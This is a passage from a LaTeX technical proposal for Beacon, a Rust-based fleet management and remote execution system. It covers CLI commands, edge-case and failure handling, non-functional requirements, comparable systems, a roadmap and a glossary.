beacon service install / remove / start / stop / restart / status
\end{lstlisting}

\subsection{Initialization}

\begin{lstlisting}[language=bash]
beacon init
# Prompts: Master Password, Captain/Commander/Viewer Passwords,
#          Domain, Server IP, Ports, Intervals
\end{lstlisting}

\subsection{Authentication}

\begin{lstlisting}[language=bash]
beacon login / logout / whoami
\end{lstlisting}

\subsection{Namespace Management}

\begin{lstlisting}[language=bash]
beacon namespace create / edit / delete / list / show
beacon namespace export / import
beacon namespace run / stop / pause / resume
\end{lstlisting}

\subsection{Group Management}

\begin{lstlisting}[language=bash]
beacon group create / edit / delete / reorder
beacon group add-namespace / remove-namespace
beacon group run
\end{lstlisting}

\subsection{Agent Management}

\begin{lstlisting}[language=bash]
beacon agent list / show / enable / disable
beacon agent remove / rename / regenerate-id
\end{lstlisting}

\subsection{User Management}

\begin{lstlisting}[language=bash]
beacon user create / edit / delete / enable / disable / list
beacon user role assign
\end{lstlisting}

\subsection{Database Operations}

\begin{lstlisting}[language=bash]
beacon db status / backup / restore / compact / vacuum / verify / export
beacon db clear / reset
\end{lstlisting}

\subsection{Encryption}

\begin{lstlisting}[language=bash]
beacon encryption enable / disable / rotate-key / status
\end{lstlisting}

\subsection{Queue Management}

\begin{lstlisting}[language=bash]
beacon queue status / clear / pause / resume / retry-failed
\end{lstlisting}

\subsection{Logs \& Audit}

\begin{lstlisting}[language=bash]
beacon logs / logs follow / logs export / logs search
beacon logs clear / clear errors / clear warnings
beacon audit logs / audit export / audit clear
\end{lstlisting}

\subsection{Scheduling \& Maintenance}

\begin{lstlisting}[language=bash]
beacon schedule create
beacon maintenance enable <tag>
beacon maintenance disable <tag>
\end{lstlisting}

\subsection{Connectivity}

\begin{lstlisting}[language=bash]
beacon server connect / disconnect / status / ping / test
\end{lstlisting}

% ═══════════════════════════════════════════════════════════════════════════════
%  22. EDGE CASES & FAILURE HANDLING
% ═══════════════════════════════════════════════════════════════════════════════
\section{Edge Cases \& Failure Handling}

\subsection{Execution Edge Cases}

\begin{itemize}[noitemsep]
    \item \textbf{Same namespace launched twice} — Lock Manager enforces configured mode (\texttt{deny}/\texttt{queue}/\texttt{replace}/\texttt{parallel})
    \item \textbf{Namespace edited during execution} — Running execution is pinned to immutable version; new version takes effect on next launch
    \item \textbf{Agent reboot during execution} — Recovery Engine resumes or marks the execution as interrupted on boot
    \item \textbf{Timeout during execution} — Execution transitions to \texttt{TimedOut}; rollback policy applied
    \item \textbf{Dependency failure} — Halts execution chain; audit record updated with failure reason
\end{itemize}

\subsection{Database Edge Cases}

\begin{itemize}[noitemsep]
    \item \textbf{Corrupted SQLite} — Integrity checks on startup trigger recovery from backup
    \item \textbf{Full disk} — Logging and metrics degrade gracefully; alert emitted
    \item \textbf{WAL corruption} — WAL is rebuilt from last clean checkpoint
    \item \textbf{Backup restore mismatch} — Schema version validation rejects incompatible restores
\end{itemize}

\subsection{Authentication Edge Cases}

\begin{itemize}[noitemsep]
    \item \textbf{Brute force} — Progressive backoff with account lockout after threshold
    \item \textbf{Password reset abuse} — Rate-limited; all attempts audited
    \item \textbf{Recovery key theft} — Invalidated on use; new key issued
    \item \textbf{Session replay} — JWT tokens are single-use via JTI claim tracking
\end{itemize}

\subsection{Metrics Edge Cases}

\begin{itemize}[noitemsep]
    \item \textbf{Missing sensors} — Collector marks as \texttt{Degraded}; null values emitted rather than crashing
    \item \textbf{Invalid temperature data} — Out-of-range values are filtered and flagged
    \item \textbf{Process explosion} — Collection is capped at configured process limit
    \item \textbf{Collector crash} — Health Engine detects failure and marks collector \texttt{Failed}; restarts independently
\end{itemize}

\subsection{Queue Edge Cases}

\begin{itemize}[noitemsep]
    \item \textbf{Infinite retries} — Hard \texttt{max\_retries} cap; overflow enters Dead Letter Queue
    \item \textbf{Duplicate delivery} — Deduplication by message ID at consumer
    \item \textbf{Message corruption} — Checksum validation on dequeue; corrupted messages moved to Dead Letter Queue
    \item \textbf{Dead-letter overflow} — Oldest dead-letter entries archived when queue limit reached
\end{itemize}

\subsection{WebSocket Edge Cases}

\begin{itemize}[noitemsep]
    \item \textbf{Slow consumers} — Back-pressure applied; oldest buffered frames dropped with warning
    \item \textbf{Client floods} — Rate limiting per connection; connections exceeding limit closed
    \item \textbf{Reconnect storms} — Exponential backoff enforced on reconnect
    \item \textbf{Memory exhaustion} — Per-client buffer cap; server closes offending connections
\end{itemize}

\subsection{Logging Edge Cases}

\begin{itemize}[noitemsep]
    \item \textbf{Log storms} — Rate limited to \texttt{max\_log\_rate}; excess records dropped with counter
    \item \textbf{Log injection} — All user-provided strings are sanitized before storage
    \item \textbf{Huge command outputs} — Truncated at configurable limit; truncation recorded in log entry
    \item \textbf{Recursive logging} — Logging subsystem writes directly to disk, never through itself
\end{itemize}

\subsection{System-Level Edge Cases}

\begin{itemize}[noitemsep]
    \item \textbf{Clock changes / time drift} — Timestamps are always UTC; monotonic clocks used for durations
    \item \textbf{Network loss} — Offline buffering activates automatically
    \item \textbf{Power loss} — SQLite WAL ensures durability; Recovery Engine handles interrupted executions on restart
    \item \textbf{Service crash} — systemd/service manager restarts agent; Recovery Engine runs on boot
    \item \textbf{Kernel upgrades} — Agent service survives restart; state is fully persisted in SQLite
\end{itemize}

% ═══════════════════════════════════════════════════════════════════════════════
%  23. NON-FUNCTIONAL REQUIREMENTS
% ═══════════════════════════════════════════════════════════════════════════════
\section{Non-Functional Requirements}

\begin{center}
\begin{tabularx}{\textwidth}{lX}
\toprule
Requirement & Specification \\
\midrule
\textbf{Language}        & Rust only — no C bindings, no shell scripts in core \\
\textbf{Runtime}         & Tokio async runtime; event-driven throughout \\
\textbf{Architecture}    & x86\_64, ARM (including Raspberry Pi) \\
\textbf{Service Model}   & Systemd service, auto-start, crash recovery \\
\textbf{Scalability}     & 1 to 1\,000+ agents from single server instance \\
\textbf{Offline}         & Full local operation without server connectivity \\
\textbf{Security}        & Secure by default; no insecure defaults exposed \\
\textbf{Shutdown}        & Graceful shutdown with in-flight execution completion \\
\textbf{Testing}         & Comprehensive unit, integration, and property-based tests \\
\textbf{Observability}   & Production-grade internal logging and health metrics \\
\textbf{Extensibility}   & Plugin architecture for collectors, operations, exporters \\
\textbf{Future}          & Multi-server federation support in roadmap \\
\textbf{Parity}          & Full remote management parity with local CLI \\
\textbf{Auditability}    & Every action traceable; audit trail is immutable \\
\textbf{RBAC Design}     & Extensible to custom roles in future releases \\
\bottomrule
\end{tabularx}
\end{center}

% ═══════════════════════════════════════════════════════════════════════════════
%  24. COMPARABLE SYSTEMS
% ═══════════════════════════════════════════════════════════════════════════════
\section{Comparable Systems}

Beacon occupies a position at the intersection of several established infrastructure systems while remaining purpose-built and Rust-native:

\begin{center}
\begin{tabularx}{\textwidth}{llX}
\toprule
System & Domain & Overlap with Beacon \\
\midrule
Salt / Ansible  & Config Management    & Namespace-based execution, agent model \\
Rundeck         & Operations Automation & RBAC execution, scheduling, audit trails \\
Zabbix          & Monitoring           & Telemetry collection, alerting, agents \\
Prometheus      & Metrics              & Time-series collection, retention tiers \\
osquery         & Fleet Visibility     & Agent identity, process monitoring, audit \\
\bottomrule
\end{tabularx}
\end{center}

Unlike any single system above, Beacon unifies remote execution, telemetry, audit, scheduling, offline operation, and fleet management into a single Rust binary pair — with a TUI, REST API, and WebSocket streaming included.

% ═══════════════════════════════════════════════════════════════════════════════
%  25. ROADMAP
% ═══════════════════════════════════════════════════════════════════════════════
\section{Roadmap}

\begin{center}
\begin{tabularx}{\textwidth}{llX}
\toprule
Phase & Milestone & Scope \\
\midrule
1 & Agent Core          & Identity, Auth, Execution Engine, SQLite storage, basic CLI \\
2 & Metrics \& Logging  & All collectors, logging engine, retention, TUI dashboard \\
3 & Server + NATS       & Beacon Server, NATS integration, REST API, multi-agent \\
4 & Audit \& Encryption & Immutable audit engine, AES-256-GCM, key rotation \\
5 & Scheduler \& Groups & Full scheduler, namespace groups, maintenance windows \\
6 & WebSocket \& TUI    & Full TUI, WebSocket streaming, live updates \\
7 & Plugin System       & Plugin API, signing, exporter plugins \\
8 & Fleet \& Federation & Multi-server support, tag-based fleet operations \\
\bottomrule
\end{tabularx}
\end{center}

% ═══════════════════════════════════════════════════════════════════════════════
%  APPENDIX A: GLOSSARY
% ═══════════════════════════════════════════════════════════════════════════════
\appendix
\section{Glossary}

\begin{description}[style=nextline, labelwidth=4cm, leftmargin=4.5cm]
    \item[\texttt{agent\_id}] SHA-256 identity derived from hardware characteristics. Stable across reboots.
    \item[Approved Operation] A typed, versioned action that Beacon can execute (e.g., \texttt{update\_packages}). Not a shell string.
    \item[Captain] Highest RBAC role. Full administrative control.
    \item[Commander] Middle RBAC role. Can execute; cannot configure.
    \item[Dead Letter Queue] Storage for messages that have exhausted all retry attempts.
    \item[Execution Lock] Per-namespace concurrency control policy.
    \item[JetStream] Persistent messaging layer built on NATS.
    \item[Namespace] A versioned, reusable workflow containing one or more approved operations.
    \item[NATS] High-performance message broker used for all agent-server communication.
    \item[Recovery Key] Primary account recovery credential generated at initialization.
    \item[Rollup] Aggregated metric snapshot at lower resolution for long-term retention.
    \item[TUI] Terminal User Interface built with Ratatui.
    \item[Viewer] Lowest RBAC role. Read-only access to all data.
    \item[WAL] Write-Ahead Log — SQLite durability mechanism.
\end{description}

% ─── End of Document ──────────────────────────────────────────────────────────
\vfill
\begin{center}
    \small\color{commentgray}
    Beacon Technical Proposal · Version 1.0 \\
    \end{center}

\end{document}